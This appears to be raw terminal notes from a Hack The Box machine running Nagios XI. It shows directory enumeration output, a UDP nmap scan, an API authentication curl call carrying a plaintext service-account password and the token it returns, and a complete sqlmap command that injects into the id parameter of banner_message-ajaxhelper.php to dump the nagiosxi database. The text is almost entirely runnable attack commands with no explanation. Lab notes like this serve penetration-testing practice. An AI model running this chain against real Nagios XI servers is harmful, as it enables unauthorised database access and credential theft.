```

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: http, php, html, txt | HTTP method: GET | Threads: 25 | Wordlist size: 11170

Output: dirsearch2

Target: http://10.129.12.126/

[22:52:10] Starting:
[22:53:26] 301 -  334B  - /axis//happyaxis.jsp  ->  https://nagios.monitored.htb/axis/happyaxis.jsp
[22:53:26] 301 -  345B  - /axis2//axis2-web/HappyAxis.jsp  ->  https://nagios.monitored.htb/axis2/axis2-web/HappyAxis.jsp
[22:53:26] 301 -  339B  - /axis2-web//HappyAxis.jsp  ->  https://nagios.monitored.htb/axis2-web/HappyAxis.jsp
[22:53:36] 301 -  367B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  https://nagios.monitored.htb/Citrix/AccessPlatform/auth/clientscripts/cookies.js
[22:53:55] 301 -  357B  - /engine/classes/swfupload//swfupload_f9.swf  ->  https://nagios.monitored.htb/engine/classes/swfupload/swfupload_f9.swf
[22:53:55] 301 -  354B  - /engine/classes/swfupload//swfupload.swf  ->  https://nagios.monitored.htb/engine/classes/swfupload/swfupload.swf
[22:53:58] 301 -  342B  - /extjs/resources//charts.swf  ->  https://nagios.monitored.htb/extjs/resources/charts.swf
[22:54:09] 301 -  352B  - /html/js/misc/swfupload//swfupload.swf  ->  https://nagios.monitored.htb/html/js/misc/swfupload/swfupload.swf

302      GET        1l        5w       27c https://nagios.monitored.htb/nagiosxi/ => https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/images => https://nagios.monitored.htb/nagiosxi/images/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/about => https://nagios.monitored.htb/nagiosxi/about/
301      GET        9l       28w      338c https://nagios.monitored.htb/nagiosxi/help => https://nagios.monitored.htb/nagiosxi/help/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/tools => https://nagios.monitored.htb/nagiosxi/tools/
301      GET        9l       28w      340c https://nagios.monitored.htb/nagiosxi/mobile => https://nagios.monitored.htb/nagiosxi/mobile/
301      GET        9l       28w      339c https://nagios.monitored.htb/nagiosxi/admin => https://nagios.monitored.htb/nagiosxi/admin/
301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/reports => https://nagios.monitored.htb/nagiosxi/reports/
301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/account => https://nagios.monitored.htb/nagiosxi/account/
301      GET        9l       28w      342c https://nagios.monitored.htb/nagiosxi/includes => https://nagios.monitored.htb/nagiosxi/includes/
301      GET        9l       28w      347c https://nagios.monitored.htb/nagiosxi/mobile/static => https://nagios.monitored.htb/nagiosxi/mobile/static/
301      GET        9l       28w      341c https://nagios.monitored.htb/nagiosxi/backend => https://nagios.monitored.htb/nagiosxi/backend/
301      GET        9l       28w      351c https://nagios.monitored.htb/nagiosxi/mobile/static/img => https://nagios.monitored.htb/nagiosxi/mobile/static/img/
301      GET        9l       28w      336c https://nagios.monitored.htb/nagiosxi/db => https://nagios.monitored.htb/nagiosxi/db/
301      GET        9l       28w      337c https://nagios.monitored.htb/nagiosxi/api => https://nagios.monitored.htb/nagiosxi/api/
```

```
sudo nmap -sU 10.129.12.126 -p1-200
Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-16 23:04 CET
Nmap scan report for monitored.htb (10.129.12.126)
Host is up (0.051s latency).
Not shown: 178 closed udp ports (port-unreach)
PORT    STATE         SERVICE
1/udp   open|filtered tcpmux
3/udp   open|filtered compressnet
13/udp  open|filtered daytime
33/udp  open|filtered dsp
58/udp  open|filtered xns-mail
65/udp  open|filtered tacacs-ds
68/udp  open|filtered dhcpc
71/udp  open|filtered netrjs-1
97/udp  open|filtered swift-rvf
98/udp  open|filtered tacnews
108/udp open|filtered snagas
109/udp open|filtered pop2
110/udp open|filtered pop3
123/udp open          ntp
124/udp open|filtered ansatrader
141/udp open|filtered emfis-cntl
142/udp open|filtered bl-idm
161/udp open          snmp
162/udp open|filtered snmptrap
167/udp open|filtered namp
185/udp open|filtered remote-kis
198/udp open|filtered dls-mon
```


```
curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=500'
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "f8b48044e3e221ae6621526b5a4f81ce5018c0c8",
    "valid_min": 500,
    "valid_until": "Wed, 17 Jan 2024 01:39:11 -0500"
}



sqlmap -u "https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'`" --level 5 --risk 3 -p id --batch -D nagiosxi --dump
```